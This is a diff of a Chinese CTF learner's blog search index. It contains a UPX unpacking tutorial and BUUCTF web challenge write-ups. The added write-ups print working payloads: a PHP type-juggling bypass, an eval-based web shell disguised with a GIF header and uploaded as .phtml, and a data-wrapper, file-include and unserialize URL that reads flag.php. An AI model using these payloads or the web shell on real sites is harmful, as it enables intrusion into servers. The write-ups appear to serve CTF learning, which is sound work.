@@ -462,12 +462,12 @@
   <entry>
     <title>UPX壳详解</title>
     <url>/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<a id="more"></a>
+    <content><![CDATA[<h1 id="UPX壳详解"><a href="#UPX壳详解" class="headerlink" title="UPX壳详解"></a>UPX壳详解</h1><a id="more"></a>
 
-<h1 id="UPX简介"><a href="#UPX简介" class="headerlink" title="UPX简介"></a>UPX简介</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPX (the Ultimate Packer for eXecutables)是一个著名的压缩壳,主要功能是压缩PE文件(比如exe,dll等文件),有时候也可能被病毒用于免杀。壳upx是一种保护程 序。一般是EXE文件的一种外保护措施，主要用途：</span><br><span class="line"></span><br><span class="line">1、让正规文件被保护起来，不容易被修改和破解。</span><br><span class="line"></span><br><span class="line">2、使文件压缩变小。</span><br><span class="line"></span><br><span class="line">3、保护杀毒软件安装程序，使之不受病毒侵害。</span><br><span class="line"></span><br><span class="line">4、木马，病毒的保护外壳，使之难以为攻破。</span><br><span class="line"></span><br><span class="line">利用特殊的算法，对EXE、DLL文件里的资源进行压缩。类似WINZIP 的效果，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，都在内存中完成。解压原理，是加壳工具在文件头里加了一段指令，告诉CPU，怎么才 能解压自己。当加壳时，其实就是给可执行的文件加上个外衣。用户执行的只是这个外壳程序。当执行这个程序的时候这个壳就会把原来的程序在内存中解开，解开 后，以后的就交给真正的程序。</span><br></pre></td></tr></table></figure>
+<h2 id="UPX简介"><a href="#UPX简介" class="headerlink" title="UPX简介"></a>UPX简介</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPX (the Ultimate Packer for eXecutables)是一个著名的压缩壳,主要功能是压缩PE文件(比如exe,dll等文件),有时候也可能被病毒用于免杀。壳upx是一种保护程 序。一般是EXE文件的一种外保护措施，主要用途：</span><br><span class="line"></span><br><span class="line">1、让正规文件被保护起来，不容易被修改和破解。</span><br><span class="line"></span><br><span class="line">2、使文件压缩变小。</span><br><span class="line"></span><br><span class="line">3、保护杀毒软件安装程序，使之不受病毒侵害。</span><br><span class="line"></span><br><span class="line">4、木马，病毒的保护外壳，使之难以为攻破。</span><br><span class="line"></span><br><span class="line">利用特殊的算法，对EXE、DLL文件里的资源进行压缩。类似WINZIP 的效果，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，都在内存中完成。解压原理，是加壳工具在文件头里加了一段指令，告诉CPU，怎么才 能解压自己。当加壳时，其实就是给可执行的文件加上个外衣。用户执行的只是这个外壳程序。当执行这个程序的时候这个壳就会把原来的程序在内存中解开，解开 后，以后的就交给真正的程序。</span><br></pre></td></tr></table></figure>
 
-<h1 id="脱壳工具"><a href="#脱壳工具" class="headerlink" title="脱壳工具"></a>脱壳工具</h1><p>upx壳的官网是：<a href="https://upx.github.io/" target="_blank" rel="noopener">https://upx.github.io/</a><br>下载最新版的upx：<a href="https://github.com/upx/upx/releases/" target="_blank" rel="noopener">https://github.com/upx/upx/releases/</a> </p>
-<h1 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h1><p><strong>（“堆栈平衡”原理）</strong></p>
+<h2 id="脱壳工具"><a href="#脱壳工具" class="headerlink" title="脱壳工具"></a>脱壳工具</h2><p>upx壳的官网是：<a href="https://upx.github.io/" target="_blank" rel="noopener">https://upx.github.io/</a><br>下载最新版的upx：<a href="https://github.com/upx/upx/releases/" target="_blank" rel="noopener">https://github.com/upx/upx/releases/</a> </p>
+<h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p><strong>（“堆栈平衡”原理）</strong></p>
 <blockquote>
 <p>call指令：<br>  1.向堆栈中压入下一行程序的地址；<br>  2.JMP到call的子程序地址处。</p>
 </blockquote>
@@ -481,12 +481,12 @@
 <p>在程序自解密或者自解压过程中, 多数壳会先将当前寄存器状态压栈, 如使用pushad, 而在解压结束后, 会将之前的寄存器值出栈, 如使用popad. 因此在寄存器出栈时, 往往程序代码被恢复, 此时硬件断点触发（这就是我们要下硬件断点的原因），然后在程序当前位置, 只需要一些单步操作, 就会到达正确的OEP位置</p>
 </blockquote>
 <p><strong>载入程序后只有esp寄存器内容发生变化，那么这个程序多半可以用ESP定律(存疑)</strong></p>
-<h1 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h1><h2 id="脱壳三步法"><a href="#脱壳三步法" class="headerlink" title="脱壳三步法"></a>脱壳三步法</h2><blockquote>
+<h2 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h2><h3 id="脱壳三步法"><a href="#脱壳三步法" class="headerlink" title="脱壳三步法"></a>脱壳三步法</h3><blockquote>
 <p>① 寻找原始OEP<br>这一步骤的主要作用就是要确定原始程序代码到底在哪里，能找到原始程序的代码，说明壳代码执行完了，我们只有找到原始OEP才能进行下一步的动作。</p>
 <p>② dump内存到文件<br>当我们找到原始OEP，调试运行到原始OEP时，只要代码被还原，我们就可以在这个地方进行dump内存，将内存中被还原的代码和数据抓取下来，重新保存成一个文件，这样脱完壳时，我们就可以用静态分析工具分析程序了。</p>
 <p>③ 修复文件<br>这一步主要就是修复IAT，对从内存中转储到本地的文件进行修复。</p>
 </blockquote>
-<h2 id="示例：BUUCTF-Reverse-新年快乐"><a href="#示例：BUUCTF-Reverse-新年快乐" class="headerlink" title="示例：BUUCTF_Reverse_新年快乐"></a>示例：BUUCTF_Reverse_新年快乐</h2><p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803160918611.png" alt="image-20200803160918611"></p>
+<h3 id="示例：BUUCTF-Reverse-新年快乐"><a href="#示例：BUUCTF-Reverse-新年快乐" class="headerlink" title="示例：BUUCTF_Reverse_新年快乐"></a>示例：BUUCTF_Reverse_新年快乐</h3><p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803160918611.png" alt="image-20200803160918611"></p>
 <p>使用ExeinfoPE查壳，确认是UPX</p>
 <p>x32dbg打开，寻找原始OEP</p>
 <p><img src="/2020/08/02/UPX%E5%A3%B3%E8%AF%A6%E8%A7%A3/image-20200803161135150.png" alt="image-20200803161135150"></p>
@@ -496,8 +496,7 @@
 <p>使用Scylla插件，Dump，自动寻找IAT，获取导入表，修复Dump文件</p>
 <p>IDA打开脱壳文件，确认成功</p>
 <p>注：原始OEP也可以通过逐条分析汇编指令寻找，难度较大；有经验的话可以直接搜索popad</p>
-<p>参考：</p>
-<p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918</a></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918" target="_blank" rel="noopener">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=314918</a></p>
 <p><a href="https://www.anquanke.com/post/id/99750" target="_blank" rel="noopener">https://www.anquanke.com/post/id/99750</a></p>
 <p><a href="https://blog.csdn.net/qq_42967398/article/details/96444954" target="_blank" rel="noopener">https://blog.csdn.net/qq_42967398/article/details/96444954</a></p>
 <p><a href="https://baijiahao.baidu.com/s?id=1662196196423030806&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1662196196423030806&amp;wfr=spider&amp;for=pc</a></p>
@@ -547,21 +546,46 @@
     <url>/2020/08/06/week20200803-20200809/</url>
     <content><![CDATA[<h1 id="Week-4-lt-2020-08-03-2020-08-09-gt"><a href="#Week-4-lt-2020-08-03-2020-08-09-gt" class="headerlink" title="Week 4&lt;2020.08.03 - 2020.08.09&gt;"></a>Week 4&lt;2020.08.03 - 2020.08.09&gt;</h1><a id="more"></a>
 
-<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>查看源代码，/pay.php</p>
+<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>网页给出提示<strong>Try to find out source file!</strong><br>访问备份文件：/index.php.bak<br>源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>即：<br>以GET方式传参，key值等于”123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”（字符串）<br>key值要求为数字</p>
+<p>考点：</p>
+<blockquote>
+<p>PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉</p>
+</blockquote>
+<p>payload: /?key=123</p>
+<p>flag{32bbbcc8-df1b-419c-b0f7-fc8fe3bd9e48}</p>
+<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>查看源代码，/pay.php</p>
 <p>网页源代码注意到：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>burpsuite拦截：<br><img src="/2020/08/06/week20200803-20200809/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200806022344298.png" alt="image-20200806022344298"></p>
+<p>burpsuite拦截：<br><img src="/2020/08/06/week20200803-20200809/image-20200806022344298.png" alt="image-20200806022344298"></p>
+<p>repeater：</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200806025631219.png" alt="image-20200806025631219"></p>
 <p>绕过<code>is_numeric()</code>的方法：</p>
 <blockquote>
 <p><strong>php中的is_numeric()漏洞</strong><br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
 </blockquote>
-<p>repeater：</p>
-<p><img src="/2020/08/06/week20200803-20200809/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200806025631219.png" alt="image-20200806025631219"></p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200806025600159.png" alt="image-20200806025600159"></p>
 <p>提示 <strong>Flag need your 100000000 money</strong></p>
-<p><img src="/2020/08/06/week20200803-20200809/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200806025600159.png" alt="image-20200806025600159"></p>
-<p><img src="/2020/08/06/week20200803-20200809/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200806025538945.png" alt="image-20200806025538945"></p>
-<p><img src="/2020/08/06/week20200803-20200809/C:%5CUsers%5CHp%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200806025510788.png" alt="image-20200806025510788"></p>
-<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2>]]></content>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200806025538945.png" alt="image-20200806025538945"></p>
+<p>注：这里也可以用科学计数法绕过<br><img src="/2020/08/06/week20200803-20200809/image-20200806025510788.png" alt="image-20200806025510788"></p>
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>随便上传一个文件</p>
+<p>报错：</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200810024847689.png" alt="image-20200810024847689"></p>
+<p>抓包，修改后缀为.phtml，内容是</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'ye'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传成功</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200810025324304.png" alt="image-20200810025324304"></p>
+<p>蚁剑连接，在根目录下找到flag</p>
+<p><img src="/2020/08/06/week20200803-20200809/image-20200810025309017.png" alt="image-20200810025309017"></p>
+<p>flag{9b3cc74d-daad-4ad2-a788-82c9d0c3ec16}</p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>网页代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>payload:<br><a href="http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D" target="_blank" rel="noopener">http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</a></p>
+<p>flag{77a1ae97-c1ad-44d3-b1e0-99c77f190391}</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2>]]></content>
       <categories>
         <category>BUUCTF</category>
       </categories>
@@ -590,5 +614,10 @@
       <tags>
         <tag>CTF - Re</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>BUUCTF-RE-firmware-WriteUp</title>
+    <url>/2020/08/09/BUUCTF-RE-firmware-WriteUp/</url>
+    <content><![CDATA[]]></content>
   </entry>
 </search>
